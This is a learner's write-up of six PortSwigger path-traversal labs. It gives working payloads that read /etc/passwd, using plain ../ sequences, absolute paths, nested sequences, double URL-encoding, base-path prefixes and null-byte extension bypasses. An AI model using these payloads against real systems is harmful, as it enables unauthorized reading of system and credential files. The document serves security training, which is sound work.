# Lab

## Tool : Burp Suite

## Reading arbitrary files via directory traversal

### Lab: File path traversal, simple case

#### source: <https://portswigger.net/web-security/file-path-traversal/lab-simple>

* To solve the lab, retrieve the contents of the /etc/passwd file.

Solution:

To traversal, we need to take source of image like this **/image?filename=1**, after we have payload as `**/image?filename=../../../etc/passwd**`

## Common obstacles to exploiting file path traversal vulnerabilities

### Lab: File path traversal, traversal sequences blocked with absolute path bypass

#### source: <https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass>

* To solve the lab, retrieve the contents of the /etc/passwd file.

Solution:

As above we have payload as `**/image?filename=/etc/passwd**`

### Lab: File path traversal, traversal sequences stripped non-recursively

#### source: <https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively>

* To solve the lab, retrieve the contents of the /etc/passwd file.

Solution:

As above we have payload as `**/image?filename=....//....//....//etc/passwd**`

> In this lab, the filter removes *../* from the payload, so *....//....//....//* to *../../../*

### Lab: File path traversal, traversal sequences stripped with superfluous URL-decode

#### source: <https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode>

* To solve the lab, retrieve the contents of the /etc/passwd file.

Solution:

First, I have payload as `**/image?filename=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd**` but it returned *No such file* after I try to use nested traversal sequences, it still return that. Hmm, i observe the solution and realize that mechanism of filter as blocking input containing path traversal sequences and then performs a URL-decode of the input, them interspersed with each other. So my first payload after decoding firstly, it is removed by application because of blocking input containing path traversal sequences. We need to a payload is double encoding, my finally payload as `**%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66etc/passwd**` after double decoding it returned *../../../etc/passwd*.

### Lab: File path traversal, validation of start of path

#### source: <https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path>

* To solve the lab, retrieve the contents of the /etc/passwd file.

Solution:

As we can see */image?filename=/var/www/images/34.jpg* the application suppy for us a path include base folder to store images. So, we will need to go out of that and go to file *passwd*. We have payload as `**/image?filename=/var/www/images/../../../etc/passwd**`.

### Lab: File path traversal, validation of file extension with null byte bypass

#### source: <https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass>

* To solve the lab, retrieve the contents of the /etc/passwd file.

Solution:

We have payload as `*../../../etc/passwd%00.png*`. The filter check file extension so we need *.png*
> *a null byte represents the string termination point or delimiter character which means to stop processing the string immediately. Bytes following the delimiter will be ignored*

So the character after *passwd* isn't processed.

---
